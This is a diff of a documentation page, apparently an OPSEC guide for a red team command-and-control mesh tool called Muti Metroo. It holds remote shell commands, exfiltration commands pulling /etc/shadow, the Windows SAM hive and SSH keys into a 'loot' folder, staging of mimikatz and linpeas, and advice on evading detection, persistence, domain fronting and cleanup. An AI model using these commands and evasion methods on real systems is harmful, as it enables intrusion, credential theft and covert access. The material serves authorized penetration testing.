@@ -11,54 +11,77 @@ This guide covers operational security (OPSEC) considerations for using Muti Met
 This documentation is intended for authorized security professionals conducting legitimate penetration tests, red team exercises, or security research. Always ensure you have proper written authorization before deploying Muti Metroo in any environment.
 :::
 
-## OPSEC Configuration
+## Operational Overview
 
-Muti Metroo includes several configurable options to reduce detection surface during operations.
+Muti Metroo provides a mesh networking capability with the following red team features:
+
+| Capability | Description |
+|------------|-------------|
+| Multi-hop routing | Traffic routed through multiple nodes for attribution resistance |
+| E2E encryption | X25519 + ChaCha20-Poly1305 per-stream (transit cannot decrypt) |
+| Remote shell | Interactive PTY and streaming command execution |
+| File transfer | Bidirectional file/directory exfiltration |
+| Topology protection | Management key encryption hides mesh structure |
+| Transport flexibility | QUIC, HTTP/2, WebSocket with proxy support |
+| Cross-platform | Linux, macOS, Windows (including ConPTY) |
+
+## Binary Characteristics
+
+### Size and Dependencies
+
+| Platform | Binary Size (stripped) |
+|----------|----------------------|
+| Linux amd64 | ~4 MB (UPX compressed) |
+| Linux arm64 | ~3.5 MB (UPX compressed) |
+| macOS | ~13 MB (signed, notarized) |
+| Windows | ~4-13 MB |
+
+The binary is statically compiled with no runtime dependencies. Key characteristics:
+
+- Standard Go executable (no shellcode or injection)
+- No external DLL requirements on Windows
+- Can be renamed to blend with environment
+- Supports stripping (`-ldflags="-s -w"`)
+
+### Build Considerations
+
+```bash
+# Build with stripped symbols (smaller binary)
+go build -ldflags="-s -w" -o agent ./cmd/muti-metroo
+
+# Cross-compile for target platform
+GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o agent-linux ./cmd/muti-metroo
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent.exe ./cmd/muti-metroo
+```
+
+## OPSEC Configuration
 
 ### Protocol Identifier Customization
 
-By default, Muti Metroo uses identifiable protocol strings that can be detected by network security tools. These can be customized or disabled entirely.
+By default, Muti Metroo uses identifiable protocol strings. Disable all custom identifiers for stealth:
 
 ```yaml
 protocol:
-  # ALPN for QUIC/TLS connections (default: "muti-metroo/1")
-  # Set to empty string "" to disable custom ALPN
-  alpn: ""
-
-  # HTTP header for H2 transport (default: "X-Muti-Metroo-Protocol")
-  # Set to empty string "" to disable
-  http_header: ""
-
-  # WebSocket subprotocol (default: "muti-metroo/1")
-  # Set to empty string "" to disable
-  ws_subprotocol: ""
+  alpn: ""           # Disable custom ALPN (QUIC/TLS)
+  http_header: ""    # Disable X-Muti-Metroo-Protocol header
+  ws_subprotocol: "" # Disable WebSocket subprotocol
 ```
 
-**Stealth mode example:**
-
-```yaml
-protocol:
-  alpn: ""
-  http_header: ""
-  ws_subprotocol: ""
-```
-
-With all identifiers disabled:
-- QUIC/TLS connections use standard TLS 1.3 without custom ALPN
-- HTTP/2 connections have no distinguishing headers
-- WebSocket connections use no custom subprotocol
+| Identifier | Default Value | Network Visibility |
+|------------|---------------|-------------------|
+| ALPN | `muti-metroo/1` | TLS ClientHello, visible to middleboxes |
+| HTTP Header | `X-Muti-Metroo-Protocol` | HTTP/2 headers |
+| WS Subprotocol | `muti-metroo/1` | WebSocket upgrade request |
 
 ### HTTP Endpoint Hardening
 
-The HTTP API server exposes various endpoints that may leak operational information. Use granular controls to minimize exposure.
+The HTTP API can leak operational information. Minimize exposure:
 
 ```yaml
 http:
   enabled: true
-  address: "127.0.0.1:8080"  # Bind to localhost only
-
-  # Minimal mode - only health endpoints (/health, /healthz, /ready)
-  minimal: true
+  address: "127.0.0.1:8080"  # Localhost only
+  minimal: true              # Only /health, /healthz, /ready
 ```
 
 Or with granular control:
@@ -67,26 +90,350 @@ Or with granular control:
 http:
   enabled: true
   address: "127.0.0.1:8080"
-
-  # Disable information-leaking endpoints
-  pprof: false       # Go profiling - never in production
-  dashboard: false   # Web UI shows topology
-  remote_api: false  # Remote agent APIs
+  pprof: false       # NEVER enable in operations
+  dashboard: false   # Exposes topology
+  remote_api: false  # Exposes agent list
 ```
 
-Disabled endpoints return HTTP 404 (indistinguishable from non-existent paths) while logging access attempts at debug level for awareness.
+Disabled endpoints return HTTP 404 (indistinguishable from non-existent paths).
 
-### Recommended Operational Configurations
+### Environment Variable Substitution
 
-#### Minimal Footprint (Relay/Transit)
-
-For transit nodes that only relay traffic:
+Configs support environment variables for credential separation:
 
 ```yaml
+socks5:
+  auth:
+    users:
+      - username: "${SOCKS_USER}"
+        password: "${SOCKS_PASS}"
+
+shell:
+  password_hash: "${SHELL_HASH}"
+
+management:
+  public_key: "${MGMT_PUBKEY}"
+```
+
+This allows credentials to be passed at runtime without filesystem artifacts.
+
+## Transport Selection
+
+Choose transports based on target environment and evasion requirements:
+
+### QUIC (UDP)
+
+**Best for:** High performance, NAT traversal, mobile networks
+
+```yaml
+listeners:
+  - transport: quic
+    address: "0.0.0.0:443"  # Use common port
+```
+
+**Considerations:**
+- UDP-based, may trigger alerts on networks expecting TCP-only
+- Excellent performance with native multiplexing
+- Works well through NAT without port forwarding
+- Some enterprise firewalls block non-TCP/80/443
+
+### HTTP/2 (TCP)
+
+**Best for:** Corporate environments, blending with HTTPS traffic
+
+```yaml
+listeners:
+  - transport: h2
+    address: "0.0.0.0:443"
+    path: "/api/v2/stream"  # Realistic API path
+```
+
+**Considerations:**
+- Indistinguishable from normal HTTPS on wire
+- Works through TLS-inspecting proxies (with valid certs)
+- Single TCP connection with frame multiplexing
+- Path should match cover story (e.g., `/api/`, `/ws/`, `/connect`)
+
+### WebSocket (TCP)
+
+**Best for:** Maximum compatibility, HTTP proxy traversal, CDN fronting
+
+```yaml
+listeners:
+  - transport: ws
+    address: "0.0.0.0:443"
+    path: "/socket.io/"  # Common WebSocket path
+
+peers:
+  - transport: ws
+    address: "wss://cdn-endpoint.example.com:443/api/realtime"
+    proxy: "http://corporate-proxy.internal:8080"
+    proxy_auth:
+      username: "${PROXY_USER}"
+      password: "${PROXY_PASS}"
+```
+
+**Considerations:**
+- **HTTP proxy support** with authentication
+- Works through corporate proxies and CDNs
+- Can use domain fronting techniques
+- Upgrade headers may be logged
+
+### Transport Comparison Matrix
+
+| Factor | QUIC | HTTP/2 | WebSocket |
+|--------|------|--------|-----------|
+| Protocol | UDP | TCP | TCP |
+| Default Port | 443 | 443 | 443/80 |
+| Proxy Support | No | Limited | **Yes** |
+| CDN Fronting | No | Yes | **Yes** |
+| Corporate Firewall | Medium | High | **High** |
+| Performance | **Best** | Good | Good |
+| NAT Traversal | **Best** | Good | Good |
+
+## C2 Capabilities
+
+### Remote Command Execution
+
+Muti Metroo supports two shell execution modes:
+
+#### Streaming Mode (Default)
+
+Non-PTY execution for simple commands and continuous output:
+
+```bash
+# One-shot commands
+muti-metroo shell <agent-id> whoami
+muti-metroo shell <agent-id> cat /etc/passwd
+muti-metroo shell <agent-id> ipconfig /all
+
+# Long-running with streaming output
+muti-metroo shell <agent-id> tail -f /var/log/auth.log
+muti-metroo shell <agent-id> tcpdump -i eth0
+```
+
+#### Interactive Mode (--tty)
+
+Full PTY allocation for interactive programs:
+
+```bash
+# Interactive shells
+muti-metroo shell --tty <agent-id> bash
+muti-metroo shell --tty <agent-id> powershell
+muti-metroo shell --tty <agent-id> cmd.exe
+
+# Interactive tools
+muti-metroo shell --tty <agent-id> vim /etc/hosts
+muti-metroo shell --tty <agent-id> htop
+muti-metroo shell --tty <agent-id> python3
+```
+
+**Platform Support:**
+
+| Platform | Streaming | Interactive (PTY) |
+|----------|-----------|-------------------|
+| Linux | Yes | Yes (creack/pty) |
+| macOS | Yes | Yes (creack/pty) |
+| Windows | Yes | Yes (ConPTY) |
+
+:::info Windows ConPTY
+Windows agents use ConPTY (Windows Pseudo Console) for interactive sessions. Available on Windows 10 1809+ and Windows Server 2019+. Supports full terminal emulation including colors, cursor movement, and window resize.
+:::
+
+#### Shell Configuration
+
+```yaml
+shell:
+  enabled: true
+  whitelist:
+    - "*"              # Allow all (operational use)
+    # Or specific commands:
+    # - bash
+    # - powershell
+    # - cmd
+    # - whoami
+  password_hash: "$2a$10$..."  # bcrypt hash
+  timeout: 0s          # 0 = no timeout
+  max_sessions: 0      # 0 = unlimited
+```
+
+**Security notes:**
+- Command whitelist prevents unauthorized command execution
+- Dangerous shell metacharacters are blocked: `; & | $ \` ( ) { } [ ] < > \ ! * ? ~`
+- Absolute paths in arguments are rejected
+- Password authentication adds protection layer
+
+### File Operations
+
+#### File Exfiltration
+
+```bash
+# Download single file
+muti-metroo download <agent-id> /etc/shadow ./loot/shadow
+muti-metroo download <agent-id> C:\Windows\System32\config\SAM ./loot/SAM
+
+# Download entire directory (auto tar+gzip)
+muti-metroo download <agent-id> /home/user/.ssh ./loot/ssh-keys
+muti-metroo download <agent-id> C:\Users\target\Documents ./loot/docs
+```
+
+#### Tool Staging
+
+```bash
+# Upload single file
+muti-metroo upload <agent-id> ./tools/linpeas.sh /tmp/lp.sh
+muti-metroo upload <agent-id> ./tools/mimikatz.exe C:\Windows\Temp\m.exe
+
+# Upload directory (maintains structure)
+muti-metroo upload <agent-id> ./toolkit /tmp/toolkit
+```
+
+#### File Transfer Configuration
+
+```yaml
+file_transfer:
+  enabled: true
+  password_hash: "$2a$10$..."
+  max_file_size: 0        # 0 = unlimited
+  allowed_paths:
+    - "/"                 # Full filesystem (operational)
+    # Or restricted:
+    # - /tmp
+    # - /home/*/
+    # - C:\Users\*\Documents
+```
+
+**Features:**
+- Streaming transfer (no memory limits)
+- Directory support with tar/gzip compression
+- File permissions preserved
+- Symlink validation (prevents escape attacks)
+- Path traversal protection
+
+### Multi-Hop Routing
+
+Traffic is automatically routed through the mesh for attribution resistance:
+
+```
+Operator -> Ingress -> Transit1 -> Transit2 -> Exit -> Target
+```
+
+**Path characteristics:**
+- Each hop only sees adjacent peers
+- E2E encryption prevents transit inspection
+- Routes propagate via flooding (automatic discovery)
+- Longest-prefix-match for route selection
+
+**Practical limits:**
+
+| Use Case | Max Hops | Limiting Factor |
+|----------|----------|-----------------|
+| Interactive SSH | 8-12 | Latency (~5-50ms/hop) |
+| File Transfer | 12-16 | Throughput |
+| High-latency WAN | 4-6 | 30s stream timeout |
+
+## Management Key Encryption
+
+Management key encryption provides cryptographic compartmentalization. When enabled, NodeInfo (hostnames, OS, IPs, peer lists) is encrypted so only operators can view topology.
+
+### Threat Model
+
+**Protected against:**
+- Blue team captures agent, enables dashboard -> sees encrypted blobs only
+- Blue team dumps agent memory -> no private key present
+- Blue team analyzes network traffic -> NodeInfo encrypted
+- Compromised field agent -> cannot expose other agents' details
+
+**Not protected against:**
+- Traffic analysis (connection patterns visible)
+- Agent ID correlation (IDs remain plaintext for routing)
+- Compromise of operator machine with private key
+
+### Key Generation
+
+```bash
+muti-metroo management-key generate
+```
+
+Output:
+```
+Management Keypair Generated
+============================
+Public Key:  a1b2c3d4e5f6... (64 hex chars)
+Private Key: e5f6a7b8c9d0... (64 hex chars)
+
+IMPORTANT: Store the private key securely!
+```
+
+### Deployment Configuration
+
+**All field agents (encrypt only):**
+
+```yaml
+management:
+  public_key: "a1b2c3d4e5f6789012345678901234567890123456789012345678901234abcd"
+  # NO private_key - field agents cannot decrypt
+```
+
+**Operator nodes (can decrypt):**
+
+```yaml
+management:
+  public_key: "a1b2c3d4e5f6789012345678901234567890123456789012345678901234abcd"
+  private_key: "e5f6a7b8c9d012345678901234567890123456789012345678901234567890ef"
+```
+
+### What Gets Protected
+
+| Data | Encrypted | Plaintext | Reason |
+|------|:---------:|:---------:|--------|
+| Hostname, OS, IPs | Yes | | System identification |
+| Peer list | Yes | | Topology exposure |
+| Agent display name | Yes | | Operational naming |
+| Agent IDs | | Yes | Required for routing |
+| Route CIDRs/metrics | | Yes | Required for routing |
+| Stream data | | Yes | Separate E2E encryption |
+
+### API Behavior Without Private Key
+
+When accessing dashboard APIs on a field agent (no private key):
+
+```json
+// GET /api/dashboard
+{
+  "agent": { "display_name": "local-only", "is_local": true },
+  "peers": [],     // Empty - no peer info exposed
+  "routes": []     // Empty - no route info exposed
+}
+
+// GET /api/nodes
+{
+  "nodes": [
+    { "is_local": true }  // Only local node visible
+  ]
+}
+```
+
+## Recommended Configurations
+
+### Minimal Transit Node
+
+Relay-only node with minimum footprint:
+
+```yaml
+agent:
+  data_dir: "/var/lib/app-cache"
+  log_level: "error"
+
 protocol:
   alpn: ""
   http_header: ""
   ws_subprotocol: ""
+
+listeners:
+  - transport: h2
+    address: "0.0.0.0:443"
+    path: "/api/health"
 
 http:
   enabled: true
@@ -104,11 +451,53 @@ shell:
 
 file_transfer:
   enabled: false
+
+management:
+  public_key: "${MGMT_PUBKEY}"
 ```
 
-#### Ingress Node
+### Full C2 Endpoint
 
-For SOCKS5 ingress points:
+Complete capability for target access:
+
+```yaml
+agent:
+  data_dir: "/opt/.cache/app"
+  log_level: "error"
+
+protocol:
+  alpn: ""
+  http_header: ""
+  ws_subprotocol: ""
+
+listeners:
+  - transport: ws
+    address: "0.0.0.0:443"
+    path: "/ws/v1"
+
+http:
+  enabled: true
+  address: "127.0.0.1:8080"
+  minimal: true
+
+shell:
+  enabled: true
+  whitelist: ["*"]
+  password_hash: "${SHELL_HASH}"
+  max_sessions: 0
+
+file_transfer:
+  enabled: true
+  password_hash: "${FILE_HASH}"
+  allowed_paths: ["/"]
+
+management:
+  public_key: "${MGMT_PUBKEY}"
+```
+
+### Ingress with SOCKS5
+
+Entry point for operator traffic:
 
 ```yaml
 protocol:
@@ -123,363 +512,158 @@ socks5:
     enabled: true
     users:
       - username: "operator"
-        password_hash: "$2a$10$..."  # Use bcrypt hash
+        password_hash: "${SOCKS_HASH}"
 
 http:
   enabled: true
   address: "127.0.0.1:8080"
   minimal: true
-```
 
-#### Exit Node
-
-For exit points with specific route advertisements:
-
-```yaml
-protocol:
-  alpn: ""
-  http_header: ""
-  ws_subprotocol: ""
-
-exit:
-  enabled: true
-  routes:
-    - "10.0.0.0/8"  # Only advertise target network
-
-http:
-  enabled: true
-  address: "127.0.0.1:8080"
-  pprof: false
-  dashboard: false
-  remote_api: false
-```
-
-## Transport Selection
-
-Choose transports based on the target environment:
-
-| Transport | Best For | Detection Considerations |
-|-----------|----------|-------------------------|
-| **QUIC** | High performance, NAT traversal | UDP-based, may trigger alerts on non-standard ports |
-| **HTTP/2** | Corporate environments | Blends with HTTPS traffic on port 443 |
-| **WebSocket** | Maximum compatibility | Works through HTTP proxies, CDNs |
-
-### WebSocket Through Corporate Proxies
-
-WebSocket is often the best choice for egress through corporate environments:
-
-```yaml
-peers:
-  - id: "external-relay-id"
-    transport: ws
-    address: "wss://legitimate-looking-domain.com:443/api/stream"
-    proxy: "http://corporate-proxy.internal:8080"
-    proxy_auth:
-      username: "${PROXY_USER}"
-      password: "${PROXY_PASS}"
-```
-
-### HTTP/2 on Standard Ports
-
-HTTP/2 on port 443 blends with normal HTTPS traffic:
-
-```yaml
-listeners:
-  - transport: h2
-    address: "0.0.0.0:443"
-    path: "/api/v1/stream"  # Use realistic-looking path
-```
-
-## Operational Considerations
-
-### Logging
-
-Configure minimal logging to reduce disk artifacts:
-
-```yaml
-agent:
-  log_level: "error"  # Only log errors
-  log_format: "json"  # Easier to parse/filter
-```
-
-### Certificate Management
-
-Use certificates that don't stand out:
-
-1. **Generate realistic certificate names:**
-   ```bash
-   muti-metroo cert ca -n "Internal Services CA" -o ./certs
-   muti-metroo cert agent -n "api-gateway-01" \
-     --ca ./certs/ca.crt \
-     --ca-key ./certs/ca.key \
-     -o ./certs
-   ```
-
-2. **Match organizational naming conventions** when possible
-
-3. **Use appropriate validity periods** - very long or very short validity may appear suspicious
-
-### File and Directory Locations
-
-Consider operational placement:
-
-```yaml
-agent:
-  data_dir: "/var/lib/app-service/data"  # Blend with system services
-```
-
-Avoid obvious paths like `/tmp/c2/` or `/home/user/metroo/`.
-
-### Process and Binary Considerations
-
-- Rename the binary to match the environment
-- Use system service installation for persistence and legitimacy
-- Consider memory-only operation where possible
-
-### Network Behavior
-
-- **Beaconing patterns**: Default keepalive is 30s - consider adjusting for target environment norms
-- **Connection timing**: Stagger peer connections to avoid burst patterns
-- **Traffic volume**: Match expected traffic patterns for the cover story
-
-## C2 Capabilities
-
-Muti Metroo provides several command and control capabilities:
-
-### Remote Command Execution (Shell)
-
-```yaml
-shell:
-  enabled: true
-  whitelist:
-    - "*"  # Allow all commands (use specific list in production)
-  password_hash: "$2a$10$..."
-  timeout: 60s
-```
-
-Execute commands remotely:
-```bash
-# One-shot commands (default streaming mode)
-muti-metroo shell <target-agent-id> whoami
-muti-metroo shell <target-agent-id> cat /etc/passwd
-
-# Interactive shell (requires --tty)
-muti-metroo shell --tty <target-agent-id> bash
-```
-
-### File Exfiltration
-
-```yaml
-file_transfer:
-  enabled: true
-  password_hash: "$2a$10$..."
-  allowed_paths:
-    - "/"  # Full filesystem access
-```
-
-Transfer files:
-```bash
-# Download from target
-muti-metroo download <target-id> /etc/shadow ./loot/shadow
-
-# Upload tools
-muti-metroo upload <target-id> ./tools/linpeas.sh /tmp/lp.sh
-```
-
-### Multi-Hop Routing
-
-Traffic can be routed through multiple nodes for attribution resistance:
-
-```
-Operator -> Ingress -> Transit1 -> Transit2 -> Exit -> Target
-```
-
-Each hop only sees adjacent peers, not the full path.
-
-## Management Key Encryption
-
-Management key encryption provides cryptographic compartmentalization of mesh topology data. When enabled, NodeInfo (hostnames, OS details, IP addresses, peer lists) is encrypted with a management public key using sealed boxes. Only operators with the corresponding private key can decrypt and view topology details. Compromised field agents see only opaque encrypted blobs containing 60 bytes of overhead (ephemeral public key + nonce + authentication tag) plus encrypted content.
-
-### Threat Model
-
-**Protected against:**
-- Blue team captures agent, enables dashboard -> sees encrypted data only
-- Blue team dumps agent memory -> no private key present
-- Blue team analyzes network traffic -> NodeInfo/paths encrypted
-
-**Not protected against:**
-- Traffic analysis (connection patterns still visible)
-- Agent ID correlation (IDs remain plaintext for routing)
-- Compromise of operator machine with private key
-
-### Generating Management Keys
-
-Use the CLI to generate a new management keypair:
-
-```bash
-muti-metroo management-key generate
-```
-
-Output:
-```
-Management Public Key: a1b2c3d4e5f6789...  (64 hex chars)
-Management Private Key: e5f6a7b8c9d0...    (64 hex chars)
-
-Add to ALL agent configs:
-  management:
-    public_key: "a1b2c3d4e5f6789..."
-
-Add to OPERATOR config only:
-  management:
-    private_key: "e5f6a7b8c9d0..."
-```
-
-### Configuration
-
-**All field agents (encrypt only):**
-
-```yaml
 management:
-  public_key: "a1b2c3d4e5f6789012345678901234567890123456789012345678901234abcd"
+  public_key: "${MGMT_PUBKEY}"
+  private_key: "${MGMT_PRIVKEY}"  # Operator can view topology
 ```
 
-**Operator nodes (can decrypt):**
+## Persistence
 
-```yaml
-management:
-  public_key: "a1b2c3d4e5f6789012345678901234567890123456789012345678901234abcd"
-  private_key: "e5f6a7b8c9d012345678901234567890123456789012345678901234567890ef"
+### System Service Installation
+
+Install as a system service for persistence:
+
+```bash
+# Linux (systemd)
+sudo muti-metroo service install -c /etc/app-service/config.yaml
+
+# macOS (launchd)
+sudo muti-metroo service install -c /Library/Application\ Support/AppService/config.yaml
+
+# Windows (Windows Service)
+muti-metroo.exe service install -c C:\ProgramData\AppService\config.yaml
 ```
 
-### What Gets Protected
+**Service names and paths:**
+- Linux: `/etc/systemd/system/muti-metroo.service`
+- macOS: `/Library/LaunchDaemons/com.muti-metroo.plist`
+- Windows: Windows Service Manager
 
-| Data | Encrypted | Plaintext | Reason |
-|------|-----------|-----------|--------|
-| NodeInfo (hostname, OS, IPs) | Yes | | System identification |
-| NodeInfo (peers, public key) | Yes | | Topology exposure |
-| Agent IDs | | Yes | Required for routing |
-| Route Paths | | Yes | Required for multi-hop routing |
-| Route CIDRs/Metrics | | Yes | Required for routing |
-| SeenBy lists | | Yes | Required for loop prevention |
-
-**Note on Route Paths**: Route paths are kept in plaintext on the wire because transit agents need them to forward streams correctly. However, without the management private key, agents cannot decrypt the NodeInfo which contains the meaningful system identification (hostnames, OS details, IP addresses). Path entries only show opaque 128-bit agent IDs.
-
-### API Behavior
-
-When the dashboard, topology, or nodes API is accessed on a node without the private key, the API returns **only local agent information**:
-
-```json
-// /api/dashboard on field agent (no private key)
-{
-  "agent": { "display_name": "Field-1", "is_local": true, ... },
-  "stats": { "peer_count": 2, "route_count": 1, ... },
-  "peers": [],    // Empty - no peer info exposed
-  "routes": []    // Empty - no route info exposed
-}
-
-// /api/nodes on field agent (no private key)
-{
-  "nodes": [
-    { "display_name": "Field-1", "hostname": "field1", "is_local": true, ... }
-    // Only local node - no remote nodes exposed
-  ]
-}
-```
-
-Operators with the private key see full topology details including all peers, routes, and remote node information.
-
-### Key Distribution
-
-**CRITICAL: Never distribute the private key to field agents.**
-
-Recommended workflow:
-1. Generate keypair on secure operator machine
-2. Distribute **public key only** to all agents via config
-3. Keep private key on operator nodes that need topology visibility
-4. Store private key backup securely offline
-
-### Key Management Best Practices
-
-**Backup:**
-- Store private key in a secure offline location (encrypted USB, password manager)
-- Keep at least two copies in separate secure locations
-- Never store private key in version control or shared drives
-
-**Rotation:**
-- Currently, all agents must use the same management key
-- To rotate keys, generate a new keypair and redeploy configs to all agents
-- Rotation requires a coordinated update across the entire mesh
-
-**Compromise Response:**
-If the management private key is compromised:
-1. The attacker can decrypt topology metadata (NodeInfo) from captured traffic
-2. Generate a new keypair immediately
-3. Redeploy all agents with the new public key
-4. The old key cannot decrypt new traffic after rotation
-
-**Per-Environment Keys:**
-For large operations, consider separate management keys per environment or engagement to limit blast radius if a key is compromised.
-
-### Setup Wizard
-
-The setup wizard (`muti-metroo init`) includes a management key step:
-- Skip (not recommended for red team ops)
-- Generate new keypair (prints both keys, asks if operator node)
-- Enter existing public key (for deploying to mesh)
+Consider renaming the binary and service to blend with the environment.
 
 ## Detection Avoidance
 
-### What Defenders Look For
+### Network Indicators
+
+| Indicator | Default | Mitigation |
+|-----------|---------|------------|
+| Custom ALPN | `muti-metroo/1` | Set empty string |
+| HTTP header | `X-Muti-Metroo-Protocol` | Set empty string |
+| WS subprotocol | `muti-metroo/1` | Set empty string |
+| Certificate CN | `muti-metroo` | Use realistic names |
+| Beaconing interval | 30s keepalive | Adjust timing |
+| Connection burst | Immediate | Stagger peer connections |
+
+### Host Indicators
 
 | Indicator | Mitigation |
 |-----------|------------|
-| Custom ALPN strings | Set `protocol.alpn: ""` |
-| X-Muti-Metroo-Protocol header | Set `protocol.http_header: ""` |
-| WebSocket subprotocol | Set `protocol.ws_subprotocol: ""` |
-| Unusual certificate CNs | Use realistic naming |
-| /debug endpoints | Set `http.minimal: true` |
-| Consistent beaconing intervals | Adjust keepalive timing |
-| Binary strings | Rename binary, strip if needed |
+| Binary name | Rename to match environment |
+| Service name | Customize service installation |
+| Config path | Use realistic system paths |
+| Log files | Set `log_level: error`, use syslog |
+| Data directory | Blend with system directories |
 
-### Endpoint Security Considerations
+### Certificate Considerations
 
-When deployed on endpoints with EDR/AV:
-- The binary is a standard Go executable
-- No shellcode or code injection
-- Network connections are standard TLS/QUIC/WebSocket
-- Consider code signing if available
+Generate certificates with realistic attributes:
+
+```bash
+# Generate CA with corporate-like name
+muti-metroo cert ca -n "Internal Services Root CA" -o ./certs
+
+# Generate agent cert matching environment
+muti-metroo cert agent -n "api-gateway-prod-01" \
+  --ca ./certs/ca.crt \
+  --ca-key ./certs/ca.key \
+  -o ./certs
+```
+
+**Certificate tips:**
+- Match organizational naming conventions
+- Use appropriate validity periods (1 year typical)
+- Consider using legitimate certificates if available
+- Self-signed certs may trigger TLS inspection alerts
 
 ## Cleanup
 
-After operations, ensure proper cleanup:
+### Uninstall Service
 
-1. **Stop and remove service:**
-   ```bash
-   muti-metroo service uninstall
-   ```
+```bash
+# Linux
+sudo muti-metroo service uninstall
 
-2. **Remove data directory:**
-   ```bash
-   rm -rf /path/to/data_dir
-   ```
+# macOS
+sudo muti-metroo service uninstall
 
-3. **Remove binary and configs:**
-   ```bash
-   rm /path/to/muti-metroo
-   rm /path/to/config.yaml
-   ```
+# Windows (as Administrator)
+muti-metroo.exe service uninstall
+```
 
-4. **Clear logs:**
-   - Remove any application logs
-   - Consider system log entries
+### Remove Artifacts
+
+```bash
+# Remove data directory
+rm -rf /path/to/data_dir
+
+# Remove binary and config
+rm /path/to/muti-metroo
+rm /path/to/config.yaml
+
+# Clear relevant logs
+# (location depends on configuration)
+```
+
+### Forensic Considerations
+
+- Agent ID is stored in `data_dir/identity.json`
+- E2E keypair stored in `data_dir/keypair.json`
+- No persistent logs by default (when `log_level: error`)
+- Memory contains active session keys
+
+## Operational Checklist
+
+### Pre-Deployment
+
+- [ ] Generate management keypair (keep private key secure)
+- [ ] Generate unique agent certificates
+- [ ] Configure stealth protocol settings (empty identifiers)
+- [ ] Set appropriate log level (`error` or `warn`)
+- [ ] Prepare environment-specific config files
+- [ ] Test connectivity through target network path
+
+### Deployment
+
+- [ ] Transfer binary (renamed appropriately)
+- [ ] Deploy config with environment variables
+- [ ] Initialize agent identity
+- [ ] Install as service (if persistence needed)
+- [ ] Verify connectivity to mesh
+- [ ] Test shell and file transfer capabilities
+
+### Post-Operation
+
+- [ ] Uninstall services on all agents
+- [ ] Remove binaries and configs
+- [ ] Clear data directories
+- [ ] Document accessed systems
+- [ ] Verify cleanup completeness
 
 ## Legal and Ethical Considerations
 
 - Always obtain written authorization before deployment
-- Document all activities for the engagement report
-- Respect scope boundaries
-- Report any unexpected findings through proper channels
-- Coordinate with blue team if required by rules of engagement
+- Document all activities for engagement report
+- Respect scope boundaries strictly
+- Report unexpected findings through proper channels
+- Coordinate with blue team per rules of engagement
+- Retain evidence per engagement requirements
 
 ---
 
@@ -487,3 +671,4 @@ For technical security details, see:
 - [End-to-End Encryption](e2e-encryption)
 - [TLS and mTLS](tls-mtls)
 - [Authentication](authentication)
+- [Access Control](access-control)
